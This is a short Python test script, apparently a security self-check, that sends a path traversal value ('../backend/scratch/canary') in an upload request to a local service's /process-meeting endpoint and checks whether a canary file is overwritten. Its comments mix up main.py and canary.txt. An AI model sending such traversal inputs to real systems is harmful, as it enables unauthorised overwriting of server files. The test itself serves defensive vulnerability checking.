import requests
import os

BASE_URL = "http://localhost:8000"

def test_overwrite_traversal():
    print("Attempting to overwrite main.py via traversal...")
    
    with open("payload.txt", "w") as f:
        f.write("# HACKED")
        
    try:
        with open("payload.txt", "rb") as f:
            # We want local_path to be "uploads/../main.py" -> which resolves to "main.py"
            # Since UPLOAD_DIR is "uploads"
            data = {
                "existing_file_id": "../backend/scratch/canary",
                "session_id": "overwrite-test"
            }
            # Note: The extension is extracted from the filename
            files = {"file": ("dummy.txt", f, "text/plain")}
            response = requests.post(f"{BASE_URL}/process-meeting", files=files, data=data)
            print(f"Response: {response.status_code} - {response.text}")
            
            if response.status_code == 200:
                print("Checking if canary.txt was modified...")
                with open("backend/scratch/canary.txt", "r") as m:
                    content = m.read()
                    print(f"Content of canary.txt: {content}")
                    if "# HACKED" in content:
                        print("!!! VULNERABILITY CONFIRMED: canary.txt overwritten !!!")
                    else:
                        print("main.py seems intact (maybe path resolution was different).")
    finally:
        if os.path.exists("payload.txt"):
            os.remove("payload.txt")

if __name__ == "__main__":
    test_overwrite_traversal()
